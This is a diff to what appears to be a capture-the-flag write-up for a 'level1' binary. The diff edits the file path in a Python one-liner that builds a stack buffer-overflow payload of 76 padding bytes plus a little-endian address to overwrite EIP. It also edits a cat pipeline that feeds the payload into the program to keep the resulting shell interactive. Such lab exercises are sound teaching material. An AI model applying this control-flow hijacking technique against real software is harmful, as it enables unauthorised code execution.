@@ -14,7 +14,7 @@ Using python we create an input to fill our buffer and overwrite
 the EIP registre with the run function address in little endian.
 
 ```Shell
-python3 -c "print('A' * 76 + '\x44\x84\x04\x08')" > output.txt
+python -c "print('A' * 76 + '\x44\x84\x04\x08')" > /tmp/input1
 
 ```
 
@@ -24,6 +24,6 @@ after executing the run function.To force the shell to be interactive we add
 and force the program to wait for user input.
 
 ```Shell
-cat /tmp/output.txt  - | ./level1
+cat /tmp/input1 - | ./level1
 
 ```
